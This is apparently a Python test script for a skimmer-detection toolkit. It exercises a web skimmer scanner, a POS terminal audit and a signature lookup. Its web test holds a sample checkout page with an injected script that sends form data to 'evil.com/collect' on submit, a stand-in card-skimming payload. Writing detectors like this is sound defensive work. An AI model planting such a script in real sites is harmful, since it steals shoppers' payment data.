#!/usr/bin/env python3
import sys
sys.path.insert(0, '.')
from skimmer_detection_toolkit import *

# Test web detector
print('=== Web Skimmer Detector ===')
html = '<html><head><script src="https://suspicious.top/analytics.js"></script></head><body><form><input id="card-number"><input id="cvv"></form><script>document.querySelector("form").addEventListener("submit",function(){fetch("https://evil.com/collect",{method:"POST",body:"data"});});</script></body></html>'
result = scan_webpage_for_skimmers(html, 'https://test.com/checkout')
data = json.loads(result)
print(f'Risk score: {data["risk_score"]}')
print(f'Suspicious: {data["suspicious"]}')
print(f'Indicators: {data["indicators"]}')

print('\n=== POS Auditor ===')
result = audit_pos_terminal({'debug_mode': True, 'encrypt_storage': False})
data = json.loads(result)
print(f'Risk score: {data["risk_score"]}')
print(f'Issues: {data["issues"]}')

print('\n=== Signatures ===')
result = get_skimmer_signatures()
data = json.loads(result)
print(f'Magecart groups: {len(data["magecart_groups"])}')
print(f'Android skimmers: {len(data["android_skimmers"])}')

print('\n=== ALL TESTS PASSED ===')
